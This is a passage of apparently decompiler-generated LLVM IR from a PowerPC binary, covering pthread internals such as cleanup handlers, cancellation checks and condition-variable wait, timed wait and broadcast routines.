  %v0_100066d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100066d0 = trunc i32 %v0_100066d0 to i8
  %v2_100066d0 = load i32, i32* %r9.global-to-local, align 4
  %v3_100066d0 = add i32 %v2_100066d0, 65
  %v4_100066d0 = inttoptr i32 %v3_100066d0 to i8*
  store i8 %v1_100066d0, i8* %v4_100066d0, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 5, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_100066c8, { 1, 0 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v3_100066d8 = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v0_100066f0 = load i32, i32* @r2, align 4
  store i32 %v0_100066f0, i32* @r30, align 4
  br i1 %v3_100066d8, label %dec_label_pc_10006708, label %dec_label_pc_100066f8

dec_label_pc_100066f8:                            ; preds = %entry
  %v1_100066fc = add i32 %tmp, 4
  %v2_100066fc = inttoptr i32 %v1_100066fc to i32*
  %v3_100066fc = load i32, i32* %v2_100066fc, align 4
  store i32 %v3_100066fc, i32* %r3.global-to-local, align 4
  %v1_10006704 = call i32 @unknown_0()
  store i32 %v1_10006704, i32* %r3.global-to-local, align 4
  %v0_10006708.pre = load i32, i32* %r31.global-to-local, align 4
  %v1_1000670c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006708

dec_label_pc_10006708:                            ; preds = %entry, %dec_label_pc_100066f8
  %v1_1000670c = phi i32 [ %v0_100066f0, %entry ], [ %v1_1000670c.pre, %dec_label_pc_100066f8 ]
  %v0_10006708 = phi i32 [ %tmp, %entry ], [ %v0_10006708.pre, %dec_label_pc_100066f8 ]
  %v1_10006708 = add i32 %v0_10006708, 12
  %v2_10006708 = inttoptr i32 %v1_10006708 to i32*
  %v3_10006708 = load i32, i32* %v2_10006708, align 4
  %v2_1000670c = add i32 %v1_1000670c, 60
  %v3_1000670c = inttoptr i32 %v2_1000670c to i32*
  store i32 %v3_10006708, i32* %v3_1000670c, align 4
  %v0_10006720 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10006720

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10006708, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v0_10006728 = load i32, i32* @r2, align 4
  store i32 %v0_10006728, i32* @r9, align 4
  %v2_1000672c = add i32 %tmp, 4
  %v3_1000672c = inttoptr i32 %v2_1000672c to i32*
  store i32 %arg3, i32* %v3_1000672c, align 4
  %v0_10006730 = load i32, i32* @r2, align 4
  %v1_10006730 = add i32 %v0_10006730, 60
  %v2_10006730 = inttoptr i32 %v1_10006730 to i32*
  %v3_10006730 = load i32, i32* %v2_10006730, align 4
  %v2_1000673c = add i32 %tmp, 12
  %v3_1000673c = inttoptr i32 %v2_1000673c to i32*
  %tmp1 = add i32 %v3_10006730, -1
  %tmp2 = icmp ult i32 %tmp1, %tmp
  br i1 %tmp2, label %dec_label_pc_10006748, label %dec_label_pc_10006750

dec_label_pc_10006748:                            ; preds = %entry
  br label %dec_label_pc_10006750

dec_label_pc_10006750:                            ; preds = %entry, %dec_label_pc_10006748
  %storemerge = phi i32 [ 0, %dec_label_pc_10006748 ], [ %v3_10006730, %entry ]
  store i32 %storemerge, i32* %v3_1000673c, align 4
  %v1_10006750 = load i32, i32* @r9, align 4
  %v2_10006750 = add i32 %v1_10006750, 60
  %v3_10006750 = inttoptr i32 %v2_10006750 to i32*
  store i32 %tmp, i32* %v3_10006750, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 2, 4, 0, 3, 1 }
  uselistorder label %dec_label_pc_10006750, { 1, 0 }
}

define i32 @pthread_testcancel(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10006764 = load i32, i32* @r2, align 4
  %v1_10006764 = add i32 %v0_10006764, 66
  %v2_10006764 = inttoptr i32 %v1_10006764 to i8*
  %v3_10006764 = load i8, i8* %v2_10006764, align 1
  %v3_10006768 = icmp eq i8 %v3_10006764, 0
  br i1 %v3_10006768, label %dec_label_pc_10006788, label %dec_label_pc_10006770

dec_label_pc_10006770:                            ; preds = %entry
  %v1_10006770 = add i32 %v0_10006764, 64
  %v2_10006770 = inttoptr i32 %v1_10006770 to i8*
  %v3_10006770 = load i8, i8* %v2_10006770, align 1
  %v3_10006774 = icmp eq i8 %v3_10006770, 0
  br i1 %v3_10006774, label %dec_label_pc_1000677c, label %dec_label_pc_10006788

dec_label_pc_1000677c:                            ; preds = %dec_label_pc_10006770
  %v0_10006784 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10006788

dec_label_pc_10006788:                            ; preds = %dec_label_pc_10006770, %entry, %dec_label_pc_1000677c
  %.0 = phi i32 [ undef, %entry ], [ %v0_10006784, %dec_label_pc_1000677c ], [ undef, %dec_label_pc_10006770 ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_10006788, { 2, 0, 1 }
}

define i32 @enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10006798 = add i32 %arg1, 24
  %v2_10006798 = inttoptr i32 %v1_10006798 to i32*
  %v3_10006798 = load i32, i32* %v2_10006798, align 4
  store i32 %v3_10006798, i32* @r11, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_100067f0.pre = load i32, i32* @r3, align 4
  %v1_100067f021 = inttoptr i32 %v0_100067f0.pre to i32*
  %v2_100067f022 = load i32, i32* %v1_100067f021, align 4
  store i32 %v2_100067f022, i32* %r9.global-to-local, align 4
  %v3_100067f425 = icmp eq i32 %v2_100067f022, 0
  br i1 %v3_100067f425, label %dec_label_pc_10006800, label %dec_label_pc_100067d0

dec_label_pc_100067d0:                            ; preds = %entry, %dec_label_pc_100067ec
  %v2_100067f0.pn = phi i32 [ %v2_100067f0, %dec_label_pc_100067ec ], [ %v2_100067f022, %entry ]
  %v2_100067f030 = phi i32 [ %v2_100067f0, %dec_label_pc_100067ec ], [ %v2_100067f022, %entry ]
  %v1_100067f029 = phi i32* [ %v1_100067f0, %dec_label_pc_100067ec ], [ %v1_100067f021, %entry ]
  %v4_100067f835 = icmp eq i32 %v2_100067f0.pn, %arg1
  %v1_100067d4 = add i32 %v2_100067f030, 8
  br i1 %v4_100067f835, label %dec_label_pc_100067d4, label %dec_label_pc_100067ec

dec_label_pc_100067d4:                            ; preds = %dec_label_pc_100067d0
  %v2_100067d4 = inttoptr i32 %v1_100067d4 to i32*
  %v3_100067d4 = load i32, i32* %v2_100067d4, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v3_100067d4, i32* %v1_100067f029, align 4
  %v1_100067e4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100067e4 = add i32 %v1_100067e4, 8
  %v3_100067e4 = inttoptr i32 %v2_100067e4 to i32*
  store i32 0, i32* %v3_100067e4, align 4
  %v0_10006804.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006804

dec_label_pc_100067ec:                            ; preds = %dec_label_pc_100067d0
  %v1_100067f0 = inttoptr i32 %v1_100067d4 to i32*
  %v2_100067f0 = load i32, i32* %v1_100067f0, align 4
  store i32 %v2_100067f0, i32* %r9.global-to-local, align 4
  %v3_100067f4 = icmp eq i32 %v2_100067f0, 0
  br i1 %v3_100067f4, label %dec_label_pc_10006800, label %dec_label_pc_100067d0

dec_label_pc_10006800:                            ; preds = %dec_label_pc_100067ec, %entry
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006804

dec_label_pc_10006804:                            ; preds = %dec_label_pc_100067d4, %dec_label_pc_10006800
  %v0_10006804 = phi i32 [ %v0_10006804.pre, %dec_label_pc_100067d4 ], [ 0, %dec_label_pc_10006800 ]
  ret i32 %v0_10006804

; uselistorder directives
  uselistorder i32 %v2_100067f0, { 2, 3, 0, 1 }
  uselistorder i32* %v1_100067f0, { 1, 0 }
  uselistorder i32 %v1_100067d4, { 1, 0 }
  uselistorder i32 %v2_100067f022, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006804, { 1, 0 }
  uselistorder label %dec_label_pc_100067d0, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10006810 = add i32 %tmp, 8
  %v3_10006810 = inttoptr i32 %v2_10006810 to i32*
  store i32 0, i32* %v3_10006810, align 4
  %v0_10006814 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10006814, i32* %arg1, align 4
  %v2_10006818 = add i32 %tmp, 4
  %v3_10006818 = inttoptr i32 %v2_10006818 to i32*
  store i32 %v0_10006814, i32* %v3_10006818, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10006824 = add i32 %arg1, 8
  %v2_10006824 = inttoptr i32 %v1_10006824 to i32*
  %v3_10006824 = load i32, i32* %v2_10006824, align 4
  %v2_10006828 = icmp ne i32 %v3_10006824, 0
  %v1_10006830 = select i1 %v2_10006828, i32 16, i32 0
  ret i32 %v1_10006830
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10006858 = icmp eq i32 %arg1, 0
  %v2_10006858 = icmp ugt i32 %arg1, 1
  %v0_10006868 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10006858, i32 %v0_10006868)
  %v1_10006870 = select i1 %v1_10006858, i32 0, i32 38
  ret i32 %v1_10006870
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10006878 = call i32 @__asm_mfcr()
  store i32 %v0_10006878, i32* %r3.global-to-local, align 4
  %v3_1000687c = icmp eq i32 %arg2, 0
  store i1 %v3_1000687c, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10006878, i32* @r31, align 4
  store i32 %v0_10006878, i32* @r4, align 4
  br i1 %v3_1000687c, label %dec_label_pc_100068bc, label %dec_label_pc_100068a4

dec_label_pc_100068a4:                            ; preds = %entry
  %v1_100068a4 = add i32 %v0_10006878, 64
  %v2_100068a4 = inttoptr i32 %v1_100068a4 to i8*
  %v3_100068a4 = load i8, i8* %v2_100068a4, align 1
  %v3_100068a8 = icmp eq i8 %v3_100068a4, 0
  br i1 %v3_100068a8, label %dec_label_pc_100068bc.thread, label %dec_label_pc_100068cc

dec_label_pc_100068bc.thread:                     ; preds = %dec_label_pc_100068a4
  %v2_100068bc4 = add i32 %v0_10006878, 444
  %v3_100068bc5 = inttoptr i32 %v2_100068bc4 to i32*
  store i32 %arg2, i32* %v3_100068bc5, align 4
  br label %dec_label_pc_100068cc

dec_label_pc_100068bc:                            ; preds = %entry
  %v1_100068b4 = add i32 %v0_10006878, 28
  %v2_100068b4 = inttoptr i32 %v1_100068b4 to i32*
  %v3_100068b4 = load i32, i32* %v2_100068b4, align 4
  store i32 %v3_100068b4, i32* @r3, align 4
  store i32 268462268, i32* @lr, align 4
  %v0_100068b8 = call i32 @__pthread_lock()
  store i32 %v0_100068b8, i32* %r3.global-to-local, align 4
  %v0_100068bc.pre = load i32, i32* @r30, align 4
  %v1_100068bc.pre = load i32, i32* @r31, align 4
  %v0_100068c0.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_100068bc = add i32 %v1_100068bc.pre, 444
  %v3_100068bc = inttoptr i32 %v2_100068bc to i32*
  store i32 %v0_100068bc.pre, i32* %v3_100068bc, align 4
  br i1 %v0_100068c0.pre, label %dec_label_pc_100068c4, label %dec_label_pc_100068cc

dec_label_pc_100068c4:                            ; preds = %dec_label_pc_100068bc
  %v0_100068c4 = load i32, i32* @r31, align 4
  %v1_100068c4 = add i32 %v0_100068c4, 28
  %v2_100068c4 = inttoptr i32 %v1_100068c4 to i32*
  %v3_100068c4 = load i32, i32* %v2_100068c4, align 4
  store i32 %v3_100068c4, i32* @r3, align 4
  store i32 268462284, i32* @lr, align 4
  %v0_100068c8 = call i32 @__pthread_unlock()
  store i32 %v0_100068c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100068cc

dec_label_pc_100068cc:                            ; preds = %dec_label_pc_100068bc.thread, %dec_label_pc_100068bc, %dec_label_pc_100068a4, %dec_label_pc_100068c4
  %v1_100068dc = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006878)
  %v9_100068dc = extractvalue %0 %v1_100068dc, 7
  store i4 %v9_100068dc, i4* @cr4, align 1
  %v0_100068e4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100068e4

; uselistorder directives
  uselistorder i32 %v0_10006878, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_100068cc, { 3, 1, 0, 2 }
}

define i32 @restart(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268462328, i32* @lr, align 4
  %v0_100068f4 = call i32 @__pthread_restart_new()
  ret i32 %v0_100068f4
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10006924.275 to i32), i32* @lr, align 4
  %v0_10006920 = call i32 @__pthread_lock()
  %v0_10006928 = load i32, i32* @r29, align 4
  %v1_10006928 = add i32 %v0_10006928, 8
  %v2_10006928 = inttoptr i32 %v1_10006928 to i32*
  %v3_10006928 = load i32, i32* %v2_10006928, align 4
  store i32 %v3_10006928, i32* @r31, align 4
  store i32 0, i32* %v2_10006928, align 4
  %v0_10006930 = load i32, i32* @r29, align 4
  store i32 %v0_10006930, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10006938.276 to i32), i32* @lr, align 4
  %v0_10006934 = call i32 @__pthread_unlock()
  %v0_100069601 = load i32, i32* @r31, align 4
  %v3_100069604 = icmp eq i32 %v0_100069601, 0
  br i1 %v3_100069604, label %dec_label_pc_10006968, label %dec_label_pc_1000693c

dec_label_pc_1000693c:                            ; preds = %entry, %dec_label_pc_1000693c
  %v0_10006940 = phi i32 [ %v0_10006960, %dec_label_pc_1000693c ], [ %v0_100069601, %entry ]
  %v1_10006940 = add i32 %v0_10006940, 8
  %v2_10006940 = inttoptr i32 %v1_10006940 to i32*
  %v3_10006940 = load i32, i32* %v2_10006940, align 4
  store i32 %v3_10006940, i32* @r29, align 4
  %v3_10006944 = add i32 %v0_10006940, 441
  %v4_10006944 = inttoptr i32 %v3_10006944 to i8*
  store i8 1, i8* %v4_10006944, align 1
  %v1_1000694c = load i32, i32* @r31, align 4
  %v2_1000694c = add i32 %v1_1000694c, 8
  %v3_1000694c = inttoptr i32 %v2_1000694c to i32*
  store i32 0, i32* %v3_1000694c, align 4
  %v0_10006954 = load i32, i32* @r31, align 4
  store i32 %v0_10006954, i32* @r3, align 4
  %v0_10006958 = load i32, i32* @r29, align 4
  store i32 %v0_10006958, i32* @r31, align 4
  store i32 268462432, i32* @lr, align 4
  %v1_1000695c = call i32 @restart(i32 %v0_10006954)
  %v0_10006960 = load i32, i32* @r31, align 4
  %v3_10006960 = icmp eq i32 %v0_10006960, 0
  br i1 %v3_10006960, label %dec_label_pc_10006968, label %dec_label_pc_1000693c

dec_label_pc_10006968:                            ; preds = %dec_label_pc_1000693c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10006960, { 1, 0 }
  uselistorder i32 %v0_10006940, { 1, 0 }
  uselistorder label %dec_label_pc_1000693c, { 1, 0 }
}

define i32 @suspend.1(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268462480, i32* @lr, align 4
  %v0_1000698c = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_1000698c
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg3, i32* @r27, align 4
  %v1_100069bc = add i32 %arg2, 12
  %v2_100069bc = inttoptr i32 %v1_100069bc to i32*
  %v3_100069bc = load i32, i32* %v2_100069bc, align 4
  %v0_100069c0 = load i32, i32* @r2, align 4
  %v3_100069c4 = icmp eq i32 %v3_100069bc, 3
  br i1 %v3_100069c4, label %dec_label_pc_100069e8, label %dec_label_pc_100069cc

dec_label_pc_100069cc:                            ; preds = %entry
  %v3_100069cc = icmp eq i32 %v3_100069bc, 0
  br i1 %v3_100069cc, label %dec_label_pc_100069e8, label %dec_label_pc_100069d4

dec_label_pc_100069d4:                            ; preds = %dec_label_pc_100069cc
  %v1_100069dc = add i32 %arg2, 8
  %v2_100069dc = inttoptr i32 %v1_100069dc to i32*
  %v3_100069dc = load i32, i32* %v2_100069dc, align 4
  %v4_100069e0 = icmp eq i32 %v3_100069dc, %v0_100069c0
  br i1 %v4_100069e0, label %dec_label_pc_100069e8, label %dec_label_pc_10006b80

dec_label_pc_100069e8:                            ; preds = %dec_label_pc_100069d4, %dec_label_pc_100069cc, %entry
  store i32 %v0_100069c0, i32* @r11, align 4
  %v2_100069fc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v3_10006a04 = add i32 %v0_100069c0, 441
  %v4_10006a04 = inttoptr i32 %v3_10006a04 to i8*
  store i8 0, i8* %v4_10006a04, align 1
  store i32 268462608, i32* @lr, align 4
  %v2_10006a0c = call i32 @__pthread_set_own_extricate_if(i32 %v0_100069c0, i32 %v2_100069fc)
  %v0_10006a10 = load i32, i32* @r31, align 4
  store i32 %v0_10006a10, i32* @r3, align 4
  store i32 %v0_100069c0, i32* @r4, align 4
  store i32 268462620, i32* @lr, align 4
  %v0_10006a18 = call i32 @__pthread_lock()
  store i32 %v0_100069c0, i32* @r9, align 4
  %v1_10006a20 = add i32 %v0_100069c0, 66
  %v2_10006a20 = inttoptr i32 %v1_10006a20 to i8*
  %v3_10006a20 = load i8, i8* %v2_10006a20, align 1
  %v3_10006a24 = icmp eq i8 %v3_10006a20, 0
  br i1 %v3_10006a24, label %dec_label_pc_10006a40, label %dec_label_pc_10006a2c

dec_label_pc_10006a2c:                            ; preds = %dec_label_pc_100069e8
  store i32 %v0_100069c0, i32* @r9, align 4
  store i32 1, i32* @r29, align 4
  %v1_10006a34 = add i32 %v0_100069c0, 64
  %v2_10006a34 = inttoptr i32 %v1_10006a34 to i8*
  %v3_10006a34 = load i8, i8* %v2_10006a34, align 1
  %v3_10006a38 = icmp eq i8 %v3_10006a34, 0
  br i1 %v3_10006a38, label %dec_label_pc_10006a50, label %dec_label_pc_10006a40

dec_label_pc_10006a40:                            ; preds = %dec_label_pc_10006a2c, %dec_label_pc_100069e8
  %v0_10006a44 = load i32, i32* @r31, align 4
  %v1_10006a44 = add i32 %v0_10006a44, 8
  store i32 0, i32* @r29, align 4
  %v2_10006a4c = call i32 @enqueue(i32 %v1_10006a44, i32 %v0_100069c0)
  br label %dec_label_pc_10006a50

dec_label_pc_10006a50:                            ; preds = %dec_label_pc_10006a2c, %dec_label_pc_10006a40
  %v0_10006a50 = load i32, i32* @r31, align 4
  store i32 %v0_10006a50, i32* @r3, align 4
  store i32 268462680, i32* @lr, align 4
  %v0_10006a54 = call i32 @__pthread_unlock()
  %v0_10006a58 = load i32, i32* @r29, align 4
  %v3_10006a58 = icmp eq i32 %v0_10006a58, 0
  br i1 %v3_10006a58, label %dec_label_pc_10006a70, label %dec_label_pc_10006a60

dec_label_pc_10006a60:                            ; preds = %dec_label_pc_10006a50
  store i32 ptrtoint (i32* @global_var_10006a6c.277 to i32), i32* @lr, align 4
  %v2_10006a68 = call i32 @__pthread_set_own_extricate_if(i32 %v0_100069c0, i32 0)
  br label %dec_label_pc_10006b38

dec_label_pc_10006a70:                            ; preds = %dec_label_pc_10006a50
  %v0_10006a70 = load i32, i32* @r30, align 4
  store i32 %v0_10006a70, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  store i32 268462716, i32* @lr, align 4
  %v0_10006a78 = call i32 @pthread_mutex_unlock()
  %v1_10006ad8 = add i32 %v0_100069c0, 440
  %v2_10006ad8 = inttoptr i32 %v1_10006ad8 to i8*
  %v1_10006ae8 = add i32 %v0_100069c0, 64
  %v2_10006ae8 = inttoptr i32 %v1_10006ae8 to i8*
  br label %dec_label_pc_10006a7c

dec_label_pc_10006a7c:                            ; preds = %dec_label_pc_10006af4, %dec_label_pc_10006a70
  %v0_10006a80 = load i32, i32* @r27, align 4
  store i32 268462728, i32* @lr, align 4
  %v2_10006a84 = inttoptr i32 %v0_10006a80 to i32*
  %v3_10006a84 = call i32 @__pthread_timedsuspend_new(i32 %v0_100069c0, i32* %v2_10006a84)
  %v3_10006a88 = icmp eq i32 %v3_10006a84, 0
  br i1 %v3_10006a88, label %dec_label_pc_10006a90, label %dec_label_pc_10006ac4

dec_label_pc_10006a90:                            ; preds = %dec_label_pc_10006a7c
  store i32 %v0_100069c0, i32* @r4, align 4
  %v0_10006a94 = load i32, i32* @r31, align 4
  store i32 %v0_10006a94, i32* @r3, align 4
  store i32 268462748, i32* @lr, align 4
  %v0_10006a98 = call i32 @__pthread_lock()
  %v0_10006a9c = load i32, i32* @r31, align 4
  %v1_10006a9c = add i32 %v0_10006a9c, 8
  store i32 %v1_10006a9c, i32* @r3, align 4
  %v2_10006aa4 = call i32 @remove_from_queue(i32 %v1_10006a9c, i32 %v0_100069c0)
  %v0_10006aac = load i32, i32* @r31, align 4
  store i32 %v0_10006aac, i32* @r3, align 4
  store i32 268462772, i32* @lr, align 4
  %v0_10006ab0 = call i32 @__pthread_unlock()
  %v3_10006ab4 = icmp eq i32 %v2_10006aa4, 0
  br i1 %v3_10006ab4, label %dec_label_pc_10006abc, label %dec_label_pc_10006b44

dec_label_pc_10006abc:                            ; preds = %dec_label_pc_10006a90
  store i32 %v0_100069c0, i32* @r3, align 4
  store i32 268462788, i32* @lr, align 4
  %v1_10006ac0 = call i32 @suspend.1(i32 %v0_100069c0)
  br label %dec_label_pc_10006ac4

dec_label_pc_10006ac4:                            ; preds = %dec_label_pc_10006a7c, %dec_label_pc_10006abc
  %v3_10006ac8 = load i8, i8* %v4_10006a04, align 1
  %v3_10006acc = icmp eq i8 %v3_10006ac8, 0
  br i1 %v3_10006acc, label %dec_label_pc_10006ad4, label %dec_label_pc_10006afc

dec_label_pc_10006ad4:                            ; preds = %dec_label_pc_10006ac4
  %v3_10006ad8 = load i8, i8* %v2_10006ad8, align 1
  %v3_10006adc = icmp eq i8 %v3_10006ad8, 0
  br i1 %v3_10006adc, label %dec_label_pc_10006af4, label %dec_label_pc_10006ae4

dec_label_pc_10006ae4:                            ; preds = %dec_label_pc_10006ad4
  %v3_10006ae8 = load i8, i8* %v2_10006ae8, align 1
  %v3_10006aec = icmp eq i8 %v3_10006ae8, 0
  br i1 %v3_10006aec, label %dec_label_pc_10006afc, label %dec_label_pc_10006af4

dec_label_pc_10006af4:                            ; preds = %dec_label_pc_10006ae4, %dec_label_pc_10006ad4
  %v0_10006af4 = load i32, i32* @r28, align 4
  %v1_10006af4 = add i32 %v0_10006af4, 1
  store i32 %v1_10006af4, i32* @r28, align 4
  br label %dec_label_pc_10006a7c

dec_label_pc_10006afc:                            ; preds = %dec_label_pc_10006ac4, %dec_label_pc_10006ae4
  store i32 268462856, i32* @lr, align 4
  %v2_10006b04 = call i32 @__pthread_set_own_extricate_if(i32 %v0_100069c0, i32 0)
  %v3_10006b0c = load i8, i8* %v2_10006ad8, align 1
  %v3_10006b10 = icmp eq i8 %v3_10006b0c, 0
  br i1 %v3_10006b10, label %dec_label_pc_10006b68.preheader, label %dec_label_pc_10006b18

dec_label_pc_10006b18:                            ; preds = %dec_label_pc_10006afc
  %v3_10006b1c = load i8, i8* %v2_10006ae8, align 1
  %v3_10006b20 = icmp eq i8 %v3_10006b1c, 0
  br i1 %v3_10006b20, label %dec_label_pc_10006b28, label %dec_label_pc_10006b68.preheader

dec_label_pc_10006b68.preheader:                  ; preds = %dec_label_pc_10006afc, %dec_label_pc_10006b18
  %v0_10006b681 = load i32, i32* @r28, align 4
  %v3_10006b684 = icmp eq i32 %v0_10006b681, 0
  %v1_10006b6c6 = add i32 %v0_10006b681, -1
  store i32 %v1_10006b6c6, i32* %r28.global-to-local, align 4
  br i1 %v3_10006b684, label %dec_label_pc_10006b74, label %dec_label_pc_10006b60

dec_label_pc_10006b28:                            ; preds = %dec_label_pc_10006b18
  %v0_10006b2c = load i32, i32* @r30, align 4
  store i8 0, i8* %v2_10006ad8, align 1
  store i32 268462904, i32* @lr, align 4
  %v1_10006b34 = call i32 @pthread_mutex_lock(i32 %v0_10006b2c)
  br label %dec_label_pc_10006b38

dec_label_pc_10006b38:                            ; preds = %dec_label_pc_10006a60, %dec_label_pc_10006b28
  %v0_10006b40 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10006b44

dec_label_pc_10006b44:                            ; preds = %dec_label_pc_10006a90, %dec_label_pc_10006b38
  store i32 268462928, i32* @lr, align 4
  %v2_10006b4c = call i32 @__pthread_set_own_extricate_if(i32 %v0_100069c0, i32 0)
  %v0_10006b50 = load i32, i32* @r30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006b58.278 to i32), i32* @lr, align 4
  %v1_10006b54 = call i32 @pthread_mutex_lock(i32 %v0_10006b50)
  br label %dec_label_pc_10006b80

dec_label_pc_10006b60:                            ; preds = %dec_label_pc_10006b68.preheader, %dec_label_pc_10006b60
  store i32 %v0_100069c0, i32* @r3, align 4
  store i32 268462952, i32* @lr, align 4
  %v1_10006b64 = call i32 @restart(i32 %v0_100069c0)
  %v0_10006b68 = load i32, i32* %r28.global-to-local, align 4
  %v3_10006b68 = icmp eq i32 %v0_10006b68, 0
  %v1_10006b6c = add i32 %v0_10006b68, -1
  store i32 %v1_10006b6c, i32* %r28.global-to-local, align 4
  br i1 %v3_10006b68, label %dec_label_pc_10006b74, label %dec_label_pc_10006b60

dec_label_pc_10006b74:                            ; preds = %dec_label_pc_10006b60, %dec_label_pc_10006b68.preheader
  %v0_10006b74 = load i32, i32* @r30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006b7c.279 to i32), i32* @lr, align 4
  %v1_10006b78 = call i32 @pthread_mutex_lock(i32 %v0_10006b74)
  br label %dec_label_pc_10006b80

dec_label_pc_10006b80:                            ; preds = %dec_label_pc_100069d4, %dec_label_pc_10006b44, %dec_label_pc_10006b74
  %v0_10006b90 = phi i32 [ 22, %dec_label_pc_100069d4 ], [ 110, %dec_label_pc_10006b44 ], [ 0, %dec_label_pc_10006b74 ]
  ret i32 %v0_10006b90

; uselistorder directives
  uselistorder i8* %v2_10006ad8, { 1, 0, 2 }
  uselistorder i32 %v0_100069c0, { 7, 6, 5, 8, 12, 11, 13, 14, 15, 9, 10, 4, 16, 3, 2, 18, 17, 19, 20, 0, 21, 1 }
  uselistorder label %dec_label_pc_10006b80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006b60, { 1, 0 }
  uselistorder label %dec_label_pc_10006b44, { 1, 0 }
  uselistorder label %dec_label_pc_10006b38, { 1, 0 }
  uselistorder label %dec_label_pc_10006b68.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10006afc, { 1, 0 }
  uselistorder label %dec_label_pc_10006ac4, { 1, 0 }
  uselistorder label %dec_label_pc_10006a50, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10006bac = add i32 %arg2, 12
  %v2_10006bac = inttoptr i32 %v1_10006bac to i32*
  %v3_10006bac = load i32, i32* %v2_10006bac, align 4
  %v0_10006bb0 = load i32, i32* @r2, align 4
  %v3_10006bb4 = icmp eq i32 %v3_10006bac, 3
  br i1 %v3_10006bb4, label %dec_label_pc_10006bd8, label %dec_label_pc_10006bbc

dec_label_pc_10006bbc:                            ; preds = %entry
  %v3_10006bbc = icmp eq i32 %v3_10006bac, 0
  br i1 %v3_10006bbc, label %dec_label_pc_10006bd8, label %dec_label_pc_10006bc4

dec_label_pc_10006bc4:                            ; preds = %dec_label_pc_10006bbc
